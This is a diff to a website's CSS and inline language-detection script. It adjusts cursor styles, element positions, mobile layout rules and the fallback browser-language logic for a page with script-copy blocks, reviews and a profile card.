@@ -37,9 +37,23 @@ body{
   -moz-osx-font-smoothing:grayscale;
   text-rendering:optimizeLegibility;
   backface-visibility:hidden;
+  cursor:default;
 }
 ::selection{background:rgba(90,160,255,.45);color:#fff}
 ::-moz-selection{background:rgba(90,160,255,.45);color:#fff}
+
+/* ===== ЖЁСТКИЙ КУРСОР ===== */
+button, a, select, .btn, .submit-btn, .auth-btn, .warning-btn, .thanks-btn, .mad-btn, .back-link, .copy-btn, .profile-btn, .auth-switch a, .auth-close {
+  cursor:pointer !important;
+}
+button:hover, a:hover, .btn:hover, .submit-btn:hover, .auth-btn:hover, .warning-btn:hover, .thanks-btn:hover, .mad-btn:hover, .back-link:hover, .copy-btn:hover, .profile-btn:hover {
+  cursor:pointer !important;
+}
+button::before, button::after, .btn::before, .btn::after, .submit-btn::before, .submit-btn::after, .auth-btn::before, .auth-btn::after, .warning-btn::before, .warning-btn::after, .thanks-btn::before, .thanks-btn::after, .mad-btn::before, .mad-btn::after, .back-link::before, .back-link::after, .copy-btn::before, .copy-btn::after, .profile-btn::before, .profile-btn::after {
+  pointer-events:none;
+}
+input, textarea { cursor:text }
+input:focus, textarea:focus { cursor:text }
 
 /* ===== ЭКРАН ЗАГРУЗКИ ===== */
 #sealLoader{
@@ -73,20 +87,8 @@ body{
 @keyframes ringSpin{from{transform:translate(-50%,-50%) rotate(0deg)}to{transform:translate(-50%,-50%) rotate(360deg)}}
 .loader-progress-wrap{width:260px;height:2px;background:rgba(30,58,95,.5);border-radius:999px;overflow:hidden;position:relative}
 .loader-progress-bar{height:100%;width:0%;background:linear-gradient(90deg,var(--blue-3),var(--blue-1),var(--blue-2));border-radius:999px;transition:width .45s cubic-bezier(.22,1,.36,1);box-shadow:0 0 12px rgba(90,160,255,.6);position:relative}
-.loader-progress-bar::after{content:'';position:absolute;right:0;top:50%;width:8px;height:8px;border-radius:50%;background:#fff;transform:translateY(-50%);box-shadow:0 0 12px #5ea0ff,0 0 22px #3a7bd5;opacity:0;transition:opacity .3s}
-#sealLoader.loading .loader-progress-bar::after{opacity:1}
 .loader-text{font-size:.85rem;color:#5b7fb5;letter-spacing:.35em;text-transform:uppercase}
 .loader-stage{font-size:.7rem;color:#3e5a80;letter-spacing:.15em;min-height:1em;transition:opacity .3s}
-@media (max-width:700px){
-  .loader-seal{width:96px;height:96px}
-  .loader-seal-core{width:52px;height:52px}
-  .loader-seal-core::before{font-size:1.5rem}
-  .loader-ring-1{width:96px;height:96px}
-  .loader-ring-2{width:76px;height:76px}
-  .loader-ring-3{width:120px;height:120px}
-  .loader-progress-wrap{width:200px}
-  .loader-text{font-size:.75rem}
-}
 
 #bg-canvas{position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.85;transform:translateZ(0)}
 .bg-vignette{position:fixed;inset:0;z-index:1;pointer-events:none;background:radial-gradient(circle at 50% 50%,transparent 40%,rgba(0,0,0,.55) 100%);transform:translateZ(0)}
@@ -104,11 +106,11 @@ h2{font-size:1.5rem;font-weight:300;letter-spacing:.1em;margin-bottom:2rem;color
 @keyframes dividerPulse{0%,100%{transform:translate(-50%,-50%) scale(1);opacity:.9}50%{transform:translate(-50%,-50%) scale(1.35);opacity:.55}}
 
 .home-buttons{display:flex;flex-direction:column;align-items:center;gap:1rem}
-.btn{display:inline-block;padding:.85rem 2.2rem;border:1px solid var(--blue-3);border-radius:999px;color:#c9d9f0;text-decoration:none;font-size:1rem;letter-spacing:.05em;transition:transform .5s var(--smooth),background .5s var(--smooth),border-color .5s var(--smooth),color .5s var(--smooth),box-shadow .5s var(--smooth);background:linear-gradient(180deg,rgba(30,58,95,.3),rgba(15,30,55,.5));cursor:pointer;font-family:inherit;min-width:220px;position:relative;overflow:hidden;isolation:isolate;transform:translateZ(0)}
-.btn::before{content:'';position:absolute;inset:-1px;border-radius:999px;padding:1px;background:linear-gradient(120deg,transparent 30%,var(--blue-2),transparent 70%);-webkit-mask:linear-gradient(#000 0 0) content-box,linear-gradient(#000 0 0);-webkit-mask-composite:xor;mask-composite:exclude;opacity:0;transition:opacity .6s var(--smooth);z-index:-1;background-size:200% 200%;animation:borderFlow 5s linear infinite}
+.btn{display:inline-block;padding:.85rem 2.2rem;border:1px solid var(--blue-3);border-radius:999px;color:#c9d9f0;text-decoration:none;font-size:1rem;letter-spacing:.05em;transition:transform .5s var(--smooth),background .5s var(--smooth),border-color .5s var(--smooth),color .5s var(--smooth),box-shadow .5s var(--smooth);background:linear-gradient(180deg,rgba(30,58,95,.3),rgba(15,30,55,.5));cursor:pointer !important;font-family:inherit;min-width:220px;position:relative;overflow:hidden;isolation:isolate;transform:translateZ(0)}
+.btn::before{content:'';position:absolute;inset:-1px;border-radius:999px;padding:1px;background:linear-gradient(120deg,transparent 30%,var(--blue-2),transparent 70%);-webkit-mask:linear-gradient(#000 0 0) content-box,linear-gradient(#000 0 0);-webkit-mask-composite:xor;mask-composite:exclude;opacity:0;transition:opacity .6s var(--smooth);z-index:-1;background-size:200% 200%;animation:borderFlow 5s linear infinite;pointer-events:none}
 @keyframes borderFlow{0%{background-position:0% 50%}100%{background-position:200% 50%}}
 .btn:hover::before{opacity:1}
-.btn:hover{background:linear-gradient(180deg,rgba(58,123,213,.4),rgba(30,60,110,.6));border-color:transparent;color:#fff;transform:translateY(-2px) scale(1.03);box-shadow:0 5px 15px rgba(58,123,213,.2),0 0 20px rgba(90,160,255,.15)}
+.btn:hover{background:linear-gradient(180deg,rgba(58,123,213,.4),rgba(30,60,110,.6));border-color:transparent;color:#fff;transform:translateY(-2px) scale(1.03);box-shadow:0 5px 15px rgba(58,123,213,.2),0 0 20px rgba(90,160,255,.15);cursor:pointer !important}
 .btn:active{transform:translateY(0) scale(.99);transition-duration:.15s}
 .btn .ripple{position:absolute;border-radius:50%;background:radial-gradient(circle,rgba(255,255,255,.6),transparent 70%);transform:scale(0);animation:ripple .8s var(--smooth) forwards;pointer-events:none;z-index:0}
 @keyframes ripple{to{transform:scale(4);opacity:0}}
@@ -122,14 +124,14 @@ footer .disclaimer{font-size:.7rem;color:#2a3f5c}
 .script-block{margin-bottom:2rem;position:relative;padding:1rem 0;width:100%}
 .script-block:last-of-type{margin-bottom:1rem}
 .copy-row{display:flex;align-items:center;justify-content:center;gap:.75rem;flex-wrap:wrap;margin-bottom:.75rem}
-.copy-text{font-size:.95rem;color:#b8cce6;padding:.85rem 1.3rem;border:1px solid var(--blue-3);border-radius:999px;background:#0a1424;user-select:all;overflow-wrap:anywhere;font-family:'Courier New',monospace;max-width:90%;text-align:left;box-shadow:inset 0 0 20px rgba(30,80,180,.08);transition:border-color .5s var(--smooth),box-shadow .5s var(--smooth)}
+.copy-text{font-size:.95rem;color:#b8cce6;padding:.85rem 1.3rem;border:1px solid var(--blue-3);border-radius:999px;background:#0a1424;user-select:all;overflow-wrap:anywhere;font-family:'Courier New',monospace;max-width:90%;text-align:left;box-shadow:inset 0 0 20px rgba(30,80,180,.08);transition:border-color .5s var(--smooth),box-shadow .5s var(--smooth);cursor:text}
 .copy-text:hover{border-color:var(--blue-1);box-shadow:inset 0 0 20px rgba(30,80,180,.15),0 0 12px rgba(58,123,213,.1)}
-.copy-btn{display:inline-flex;align-items:center;justify-content:center;width:44px;height:44px;border:1px solid var(--blue-3);border-radius:50%;background:transparent;color:#c9d9f0;font-size:1.1rem;cursor:pointer;transition:transform .5s var(--smooth),background .5s var(--smooth),border-color .5s var(--smooth),color .5s var(--smooth),box-shadow .5s var(--smooth);flex-shrink:0}
+.copy-btn{display:inline-flex;align-items:center;justify-content:center;width:44px;height:44px;border:1px solid var(--blue-3);border-radius:50%;background:transparent;color:#c9d9f0;font-size:1.1rem;cursor:pointer !important;transition:transform .5s var(--smooth),background .5s var(--smooth),border-color .5s var(--smooth),color .5s var(--smooth),box-shadow .5s var(--smooth);flex-shrink:0}
 .copy-btn:hover{background:#132a4a;border-color:var(--blue-1);color:#fff;transform:scale(1.08) rotate(4deg);box-shadow:0 0 12px rgba(58,123,213,.3)}
 .copy-btn:active{transform:scale(.95);transition-duration:.15s}
 .script-label{font-size:1.2rem;font-weight:300;color:#dce7f5;letter-spacing:.05em;background:linear-gradient(90deg,#fff,#a8d4ff);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
 
-.back-link{position:fixed;top:1.25rem;right:1.25rem;z-index:120;display:none;align-items:center;gap:.5rem;padding:.6rem 1.2rem;font-size:.85rem;letter-spacing:.05em;color:#c9d9f0;background:rgba(10,20,36,.85);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);border:1px solid var(--blue-3);border-radius:999px;cursor:pointer;transition:transform .5s var(--smooth),background .5s var(--smooth),border-color .5s var(--smooth),color .5s var(--smooth),box-shadow .5s var(--smooth);font-family:inherit;box-shadow:0 0 12px rgba(58,123,213,.08)}
+.back-link{position:fixed;top:1.25rem;right:1.25rem;z-index:120;display:none;align-items:center;gap:.5rem;padding:.6rem 1.2rem;font-size:.85rem;letter-spacing:.05em;color:#c9d9f0;background:rgba(10,20,36,.85);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);border:1px solid var(--blue-3);border-radius:999px;cursor:pointer !important;transition:transform .5s var(--smooth),background .5s var(--smooth),border-color .5s var(--smooth),color .5s var(--smooth),box-shadow .5s var(--smooth);font-family:inherit;box-shadow:0 0 12px rgba(58,123,213,.08)}
 .back-link.visible{display:inline-flex}
 .back-link::before{content:'←';font-size:1rem;transition:transform .5s var(--smooth)}
 .back-link:hover{background:rgba(19,42,74,.95);border-color:var(--blue-1);color:#fff;transform:translateX(-3px);box-shadow:0 0 15px rgba(58,123,213,.25)}
@@ -138,24 +140,22 @@ footer .disclaimer{font-size:.7rem;color:#2a3f5c}
 .reviews-title{font-size:1.8rem;font-weight:300;color:#fff;margin-bottom:.4rem;text-shadow:0 0 22px rgba(60,120,255,.3)}
 .reviews-subtitle{font-size:.9rem;color:var(--muted);margin-bottom:1.5rem}
 .review-form{background:linear-gradient(180deg,rgba(15,28,50,.85),rgba(10,20,36,.95));border:1px solid var(--blue-3);border-radius:24px;padding:2rem 2rem;max-width:600px;width:100%;margin:0 auto;text-align:left;box-shadow:0 0 60px rgba(30,80,180,.15),0 0 120px rgba(58,123,213,.08);position:relative;overflow:hidden}
-.form-label{display:block;font-size:.85rem;color:#6c8ab5;margin-bottom:.5rem;letter-spacing:.03em;position:relative}
+.form-label{display:block;font-size:.85rem;color:#6c8ab5;margin-bottom:.5rem;letter-spacing:.03em}
 .stars-input{display:flex;gap:.4rem;justify-content:center;margin-bottom:1.5rem;flex-direction:row-reverse}
 .stars-input input{display:none}
-.stars-input label{font-size:2.2rem;color:#1e3a5f;cursor:pointer;transition:color .45s var(--smooth),transform .45s var(--smooth),text-shadow .45s var(--smooth);line-height:1;user-select:none;display:inline-block}
+.stars-input label{font-size:2.2rem;color:#1e3a5f;cursor:pointer !important;transition:color .45s var(--smooth),transform .45s var(--smooth),text-shadow .45s var(--smooth);line-height:1;user-select:none;display:inline-block}
 .stars-input label:hover,.stars-input label:hover~label,.stars-input input:checked~label{color:var(--blue-2);text-shadow:0 0 14px rgba(94,160,255,.5)}
 .stars-input label:hover{transform:scale(1.18) rotate(-6deg)}
 .stars-input.error label{color:#5a1a1a;animation:shake .4s var(--smooth)}
-.stars-input.error label:hover,.stars-input.error label:hover~label{color:var(--blue-2)}
 @keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-3px)}75%{transform:translateX(3px)}}
-.review-textarea{width:100%;min-height:100px;padding:.9rem 1.1rem;background:#0a1424;border:1px solid var(--blue-3);border-radius:16px;color:#dce7f5;font-family:inherit;font-size:.95rem;line-height:1.6;resize:vertical;transition:border-color .5s var(--smooth),box-shadow .5s var(--smooth);margin-bottom:1.25rem}
+.review-textarea{width:100%;min-height:100px;padding:.9rem 1.1rem;background:#0a1424;border:1px solid var(--blue-3);border-radius:16px;color:#dce7f5;font-family:inherit;font-size:.95rem;line-height:1.6;resize:vertical;transition:border-color .5s var(--smooth),box-shadow .5s var(--smooth);margin-bottom:1.25rem;cursor:text}
 .review-textarea:focus{outline:none;border-color:var(--blue-1);box-shadow:0 0 12px rgba(58,123,213,.15),inset 0 0 15px rgba(58,123,213,.08)}
 .review-textarea::placeholder{color:#3e5a80}
-.submit-btn{display:block;width:100%;padding:.85rem 2rem;border:1px solid var(--blue-1);border-radius:999px;background:linear-gradient(180deg,rgba(58,123,213,.15),rgba(30,60,110,.2));color:#7ab0ff;font-size:.95rem;letter-spacing:.05em;cursor:pointer;font-family:inherit;position:relative;overflow:hidden;transition:transform .5s var(--smooth),background .5s var(--smooth),color .5s var(--smooth),box-shadow .5s var(--smooth)}
+.submit-btn{display:block;width:100%;padding:.85rem 2rem;border:1px solid var(--blue-1);border-radius:999px;background:linear-gradient(180deg,rgba(58,123,213,.15),rgba(30,60,110,.2));color:#7ab0ff;font-size:.95rem;letter-spacing:.05em;cursor:pointer !important;font-family:inherit;position:relative;overflow:hidden;transition:transform .5s var(--smooth),background .5s var(--smooth),color .5s var(--smooth),box-shadow .5s var(--smooth)}
 .submit-btn:hover{background:linear-gradient(180deg,var(--blue-1),#2a5aa0);color:#fff;transform:translateY(-2px) scale(1.01);box-shadow:0 5px 15px rgba(58,123,213,.25),0 0 25px rgba(90,160,255,.15)}
-.submit-btn:active{transform:scale(.98);transition-duration:.15s}
-.submit-btn:disabled{opacity:.5;cursor:not-allowed;transform:none}
+.submit-btn:disabled{opacity:.5;cursor:not-allowed !important;transform:none}
 
-.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(20px);background:rgba(10,20,36,.95);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);border:1px solid var(--blue-3);color:#fff;padding:.7rem 1.5rem;border-radius:999px;font-size:.9rem;opacity:0;pointer-events:none;transition:opacity .5s var(--smooth),transform .5s var(--smooth);z-index:600;max-width:90%;text-align:center;box-shadow:0 0 15px rgba(58,123,213,.15)}
+.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(20px);background:rgba(10,20,36,.95);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);border:1px solid var(--blue-3);color:#fff;padding:.7rem 1.5rem;border-radius:999px;font-size:.9rem;opacity:0;pointer-events:none;transition:opacity .5s var(--smooth),transform .5s var(--smooth);z-index:600;max-width:90%;text-align:center}
 .toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
 .toast.success{border-color:var(--blue-1);color:#7ab0ff}
 .toast.error{border-color:#c62828;color:#ef9a9a}
@@ -179,30 +179,28 @@ footer .disclaimer{font-size:.7rem;color:#2a3f5c}
 .warning-title{font-size:1.5rem;font-weight:400;color:#fff;margin-bottom:1.2rem;letter-spacing:.03em}
 .warning-text{font-size:.95rem;color:#b0b0b0;line-height:1.7;margin-bottom:2rem}
 .warning-text strong{color:#ff6b6b;font-weight:500}
-.warning-btn{display:inline-block;padding:.85rem 2rem;border-radius:999px;font-size:.95rem;letter-spacing:.03em;cursor:pointer;font-family:inherit;background:#1a1a1a;border:1px solid #ff3b3b;color:#fff;transition:transform .5s var(--smooth),background .5s var(--smooth),color .5s var(--smooth),box-shadow .5s var(--smooth)}
+.warning-btn{display:inline-block;padding:.85rem 2rem;border-radius:999px;font-size:.95rem;letter-spacing:.03em;cursor:pointer !important;font-family:inherit;background:#1a1a1a;border:1px solid #ff3b3b;color:#fff;transition:transform .5s var(--smooth),background .5s var(--smooth),color .5s var(--smooth),box-shadow .5s var(--smooth)}
 .warning-btn:hover{background:#ff3b3b;color:#0a0a0a;transform:scale(1.05);box-shadow:0 0 15px rgba(255,59,59,.25)}
-.warning-btn:disabled{opacity:.5;cursor:not-allowed;transform:none}
-.warning-btn:disabled:hover{background:#1a1a1a;color:#fff;transform:none}
+.warning-btn:disabled{opacity:.5;cursor:not-allowed !important;transform:none}
 
 .thanks-icon{font-size:4.5rem;line-height:1;color:var(--blue-1);margin-bottom:1rem;display:inline-block;text-shadow:0 0 22px rgba(58,123,213,.55)}
 .thanks-title{font-size:1.5rem;font-weight:400;color:#fff;margin-bottom:.8rem;letter-spacing:.03em}
 .thanks-text{font-size:.95rem;color:#b0b0b0;line-height:1.7;margin-bottom:2rem}
-.thanks-btn{display:inline-block;padding:.85rem 2rem;border-radius:999px;font-size:.95rem;letter-spacing:.03em;cursor:pointer;font-family:inherit;background:#0a1424;border:1px solid var(--blue-1);color:#7ab0ff;transition:transform .5s var(--smooth),background .5s var(--smooth),color .5s var(--smooth),box-shadow .5s var(--smooth)}
+.thanks-btn{display:inline-block;padding:.85rem 2rem;border-radius:999px;font-size:.95rem;letter-spacing:.03em;cursor:pointer !important;font-family:inherit;background:#0a1424;border:1px solid var(--blue-1);color:#7ab0ff;transition:transform .5s var(--smooth),background .5s var(--smooth),color .5s var(--smooth),box-shadow .5s var(--smooth)}
 .thanks-btn:hover{background:var(--blue-1);color:#fff;transform:scale(1.05);box-shadow:0 0 12px rgba(58,123,213,.3)}
 
 .mad-icon{font-size:4.5rem;line-height:1;color:#ff3b3b;margin-bottom:1rem;display:inline-block;font-weight:300}
 .mad-title{font-size:1.5rem;font-weight:400;color:#fff;margin-bottom:.8rem;letter-spacing:.03em}
 .mad-text{font-size:.95rem;color:#b0b0b0;line-height:1.7;margin-bottom:2rem}
-.mad-btn{display:inline-block;padding:.85rem 2rem;border-radius:999px;font-size:.95rem;letter-spacing:.03em;cursor:pointer;font-family:inherit;background:#0a1424;border:1px solid #ff3b3b;color:#ffb3b3;transition:transform .5s var(--smooth),background .5s var(--smooth),color .5s var(--smooth)}
+.mad-btn{display:inline-block;padding:.85rem 2rem;border-radius:999px;font-size:.95rem;letter-spacing:.03em;cursor:pointer !important;font-family:inherit;background:#0a1424;border:1px solid #ff3b3b;color:#ffb3b3;transition:transform .5s var(--smooth),background .5s var(--smooth),color .5s var(--smooth)}
 .mad-btn:hover{background:#ff3b3b;color:#0a0a0a;transform:scale(1.05)}
 
-.lang-switcher{display:none;position:fixed;top:1.25rem;left:1.25rem;z-index:150}
+.lang-switcher{display:none;position:fixed;top:1.25rem;right:1.25rem;left:auto;z-index:260}
 .lang-switcher.visible{display:block}
-.lang-switcher select{background:rgba(10,20,36,.85);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);color:#c9d9f0;border:1px solid var(--blue-3);border-radius:999px;padding:.5rem 1.1rem;font-size:.85rem;font-family:inherit;cursor:pointer;transition:background .5s var(--smooth),border-color .5s var(--smooth),color .5s var(--smooth);appearance:none;-webkit-appearance:none;padding-right:1.9rem;background-image:url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%235b7fb5' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");background-repeat:no-repeat;background-position:right .7rem center;background-size:14px}
+.lang-switcher select{background:rgba(10,20,36,.85);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);color:#c9d9f0;border:1px solid var(--blue-3);border-radius:999px;padding:.5rem 1.1rem;font-size:.85rem;font-family:inherit;cursor:pointer !important;transition:background .5s var(--smooth),border-color .5s var(--smooth),color .5s var(--smooth);appearance:none;-webkit-appearance:none;padding-right:1.9rem;background-image:url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%235b7fb5' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");background-repeat:no-repeat;background-position:right .7rem center;background-size:14px}
 .lang-switcher select:hover{background-color:#132a4a;border-color:var(--blue-1);color:#fff}
-.lang-switcher.shifted{left:auto;right:1.25rem}
 
-.holo-zone{position:fixed;top:1.5rem;right:1.5rem;width:200px;height:200px;z-index:50;perspective:800px;border:1px dashed rgba(90,160,255,.35);border-radius:20px;background:radial-gradient(circle at center,rgba(20,50,120,.18),transparent 70%);transition:border-color .7s var(--smooth),background .7s var(--smooth),opacity .7s var(--smooth),box-shadow .7s var(--smooth);opacity:0;pointer-events:none;visibility:hidden;overflow:hidden}
+.holo-zone{position:fixed;top:5rem;right:1.5rem;width:200px;height:200px;z-index:50;perspective:800px;border:1px dashed rgba(90,160,255,.35);border-radius:20px;background:radial-gradient(circle at center,rgba(20,50,120,.18),transparent 70%);transition:border-color .7s var(--smooth),background .7s var(--smooth),opacity .7s var(--smooth),box-shadow .7s var(--smooth);opacity:0;pointer-events:none;visibility:hidden;overflow:hidden}
 .holo-zone.active{opacity:1;pointer-events:auto;visibility:visible}
 .holo-zone.active:hover{border-color:rgba(90,160,255,.9);background:radial-gradient(circle at center,rgba(30,80,180,.28),transparent 70%);box-shadow:0 0 30px rgba(90,160,255,.2),inset 0 0 20px rgba(90,160,255,.08)}
 .holo-zone canvas{position:absolute;inset:0;width:100%;height:100%;display:block;pointer-events:none}
@@ -211,38 +209,22 @@ footer .disclaimer{font-size:.7rem;color:#2a3f5c}
 
 .auth-title{font-size:1.5rem;font-weight:400;color:#fff;margin-bottom:.5rem;letter-spacing:.03em}
 .auth-sub{font-size:.85rem;color:var(--muted);margin-bottom:2rem}
-.auth-input{width:100%;padding:.85rem 1.1rem;background:#0a1424;border:1px solid var(--blue-3);border-radius:12px;color:#dce7f5;font-family:inherit;font-size:.95rem;transition:border-color .5s var(--smooth),box-shadow .5s var(--smooth);margin-bottom:1rem;outline:none}
+.auth-input{width:100%;padding:.85rem 1.1rem;background:#0a1424;border:1px solid var(--blue-3);border-radius:12px;color:#dce7f5;font-family:inherit;font-size:.95rem;transition:border-color .5s var(--smooth),box-shadow .5s var(--smooth);margin-bottom:1rem;outline:none;cursor:text}
 .auth-input:focus{border-color:var(--blue-1);box-shadow:0 0 12px rgba(58,123,213,.15)}
 .auth-input::placeholder{color:#3e5a80}
 .auth-input.hidden{display:none}
-.auth-hint{font-size:.7rem;color:#4a6890;margin:-.6rem 0 .9rem 0;text-align:left;line-height:1.4}
-.auth-hint.hidden{display:none}
-.auth-btn{display:block;width:100%;padding:.85rem 2rem;border:1px solid var(--blue-1);border-radius:999px;background:linear-gradient(180deg,rgba(58,123,213,.2),rgba(30,60,110,.25));color:#7ab0ff;font-size:.95rem;letter-spacing:.05em;cursor:pointer;font-family:inherit;margin-bottom:.75rem;transition:transform .5s var(--smooth),background .5s var(--smooth),color .5s var(--smooth),box-shadow .5s var(--smooth)}
+.auth-btn{display:block;width:100%;padding:.85rem 2rem;border:1px solid var(--blue-1);border-radius:999px;background:linear-gradient(180deg,rgba(58,123,213,.2),rgba(30,60,110,.25));color:#7ab0ff;font-size:.95rem;letter-spacing:.05em;cursor:pointer !important;font-family:inherit;margin-bottom:.75rem;transition:transform .5s var(--smooth),background .5s var(--smooth),color .5s var(--smooth),box-shadow .5s var(--smooth)}
 .auth-btn:hover{background:linear-gradient(180deg,var(--blue-1),#2a5aa0);color:#fff;transform:scale(1.02);box-shadow:0 0 15px rgba(58,123,213,.3)}
-.auth-btn:disabled{opacity:.5;cursor:not-allowed;transform:none}
+.auth-btn:disabled{opacity:.5;cursor:not-allowed !important;transform:none}
 .auth-switch{font-size:.85rem;color:var(--muted);margin-top:1rem}
-.auth-switch a{color:#7ab0ff;text-decoration:none;cursor:pointer;transition:color .5s var(--smooth)}
+.auth-switch a{color:#7ab0ff;text-decoration:none;cursor:pointer !important;transition:color .5s var(--smooth)}
 .auth-switch a:hover{color:#a8d4ff}
-.auth-close{display:inline-block;margin-top:1rem;font-size:.85rem;color:#4a6890;cursor:pointer;transition:color .5s var(--smooth);background:none;border:none;font-family:inherit}
+.auth-close{display:inline-block;margin-top:1rem;font-size:.85rem;color:#4a6890;cursor:pointer !important;transition:color .5s var(--smooth);background:none;border:none;font-family:inherit}
 .auth-close:hover{color:#7aa8e0}
 
-/* ===== ПРОФИЛЬ — ЛЕВЫЙ ВЕРХНИЙ УГОЛ ===== */
-.profile-card{
-  display:none;
-  position:fixed;
-  top:1.25rem;
-  left:1.25rem;
-  z-index:210;
-  flex-direction:column;align-items:center;gap:.55rem;
-  background:linear-gradient(180deg,rgba(15,28,50,.92),rgba(10,20,36,.98));
-  border:1px solid var(--blue-1);border-radius:20px;
-  padding:1rem 1.25rem;width:210px;
-  box-shadow:0 0 25px rgba(58,123,213,.18),inset 0 0 30px rgba(58,123,213,.05);
-  animation:profileIn .8s var(--smooth) forwards;
-  overflow:hidden;
-}
+.profile-card{display:none;position:fixed;bottom:1.25rem;right:1.25rem;z-index:220;flex-direction:column;align-items:center;gap:.55rem;background:linear-gradient(180deg,rgba(15,28,50,.92),rgba(10,20,36,.98));border:1px solid var(--blue-1);border-radius:20px;padding:1rem 1.25rem;width:210px;box-shadow:0 0 25px rgba(58,123,213,.18),inset 0 0 30px rgba(58,123,213,.05);animation:profileIn .8s var(--smooth) forwards;overflow:hidden}
 .profile-card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--blue-2),transparent)}
-@keyframes profileIn{from{opacity:0;transform:translateY(-12px) scale(.96)}to{opacity:1;transform:translateY(0) scale(1)}}
+@keyframes profileIn{from{opacity:0;transform:translateY(12px) scale(.96)}to{opacity:1;transform:translateY(0) scale(1)}}
 .profile-card.show{display:flex}
 .profile-avatar{width:48px;height:48px;border-radius:50%;background:linear-gradient(135deg,var(--blue-1),var(--blue-3));display:flex;align-items:center;justify-content:center;color:#fff;font-size:1.25rem;font-weight:500;text-transform:lowercase;box-shadow:0 0 15px rgba(58,123,213,.35),0 0 10px rgba(120,180,255,.3) inset;border:1px solid var(--blue-2);position:relative}
 .profile-avatar::after{content:'';position:absolute;inset:-4px;border-radius:50%;border:1px solid rgba(94,160,255,.5);animation:avatarRing 5s linear infinite}
@@ -253,55 +235,35 @@ footer .disclaimer{font-size:.7rem;color:#2a3f5c}
 @keyframes statusPulse{0%,100%{opacity:1}50%{opacity:.55}}
 .profile-divider{width:100%;height:1px;background:linear-gradient(90deg,transparent,var(--blue-3),transparent);margin:.15rem 0}
 .profile-actions{display:flex;flex-direction:column;gap:.4rem;width:100%}
-.profile-btn{display:flex;align-items:center;justify-content:center;gap:.5rem;padding:.5rem .9rem;border:1px solid var(--blue-3);border-radius:999px;background:transparent;color:#b8cce6;font-family:inherit;font-size:.8rem;cursor:pointer;text-decoration:none;transition:background .5s var(--smooth),border-color .5s var(--smooth),color .5s var(--smooth),box-shadow .5s var(--smooth)}
+.profile-btn{display:flex;align-items:center;justify-content:center;gap:.5rem;padding:.5rem .9rem;border:1px solid var(--blue-3);border-radius:999px;background:transparent;color:#b8cce6;font-family:inherit;font-size:.8rem;cursor:pointer !important;text-decoration:none;transition:background .5s var(--smooth),border-color .5s var(--smooth),color .5s var(--smooth),box-shadow .5s var(--smooth)}
 .profile-btn:hover{background:#132a4a;border-color:var(--blue-1);color:#fff;box-shadow:0 0 10px rgba(58,123,213,.15)}
 .profile-btn.danger:hover{background:rgba(198,40,40,.2);border-color:#c62828;color:#ef9a9a}
 .profile-btn svg{width:13px;height:13px;flex-shrink:0}
 
 @media (max-width:700px){
-  .lang-switcher{top:.75rem;left:.75rem}
+  .lang-switcher{top:.75rem;right:.75rem}
   .lang-switcher select{padding:.4rem .9rem;font-size:.75rem;padding-right:1.7rem;background-size:12px}
-  .lang-switcher.shifted{right:.75rem}
   h1{font-size:2.5rem}
   h2{font-size:1rem}
-  .scripts-title{font-size:1.4rem;margin-bottom:1rem}
-  .copy-text{font-size:.7rem;padding:.6rem .9rem}
-  .script-label{font-size:1rem}
-  .script-block{margin-bottom:1.2rem;padding:.5rem 0}
-  footer{font-size:.7rem;margin-top:1rem}
-  footer .disclaimer{font-size:.6rem}
-  .warning-icon{font-size:3.5rem}
-  .warning-title{font-size:1.2rem}
-  .warning-text{font-size:.85rem}
-  .warning-box{padding:2rem 1.5rem}
-  .warning-btn{font-size:.85rem;padding:.75rem 1.5rem}
-  .review-form{padding:1.5rem 1.2rem}
-  .stars-input label{font-size:1.9rem}
-  .stars-input{margin-bottom:1rem}
-  .reviews-title{font-size:1.4rem}
-  .thanks-icon,.mad-icon{font-size:3.5rem}
-  .thanks-title,.mad-title{font-size:1.2rem}
-  .thanks-text,.mad-text{font-size:.85rem}
-  .thanks-box,.mad-box{padding:2rem 1.5rem}
-  .holo-zone{top:4rem;right:-1rem;width:130px;height:130px;transform:scale(.8);transform-origin:top right}
-  .holo-zone .zone-label{font-size:.55rem}
-  .profile-card{width:170px;padding:.75rem .9rem;top:.75rem;left:.75rem}
-  .profile-avatar{width:38px;height:38px;font-size:1rem}
-  .profile-name{font-size:.8rem}
+  .holo-zone{top:3.5rem;right:.5rem;width:110px;height:110px;transform:scale(.8);transform-origin:top right}
+  .profile-card{width:170px;padding:.75rem .9rem;bottom:.75rem;right:.75rem}
   .back-link{top:.75rem;right:.75rem;padding:.5rem 1rem;font-size:.75rem}
-  .review-textarea{min-height:80px}
 }
 @media (prefers-reduced-motion:reduce){
   *{animation-duration:.01ms !important;transition-duration:.01ms !important}
-  .page-content{transition:none}
 }
 </style>
 <script>
   try{
-    var __l = localStorage.getItem('seal_lang') || (navigator.language || 'en').slice(0,2);
-    if(__l === 'pt-BR' || __l === 'pt-br') __l = 'pt';
+    var __l = localStorage.getItem('seal_lang');
+    if(!__l){
+      var nav = (navigator.language || 'en').toLowerCase();
+      var base = nav.split('-')[0];
+      var allowed = ['en','es','ja','ru','pt','zh','ko','hi','de'];
+      __l = allowed.indexOf(base) !== -1 ? base : 'en';
+    }
     document.documentElement.lang = __l;
-  }catch(e){}
+  }catch(e){ document.documentElement.lang = 'en'; }
 </script>
 </head>
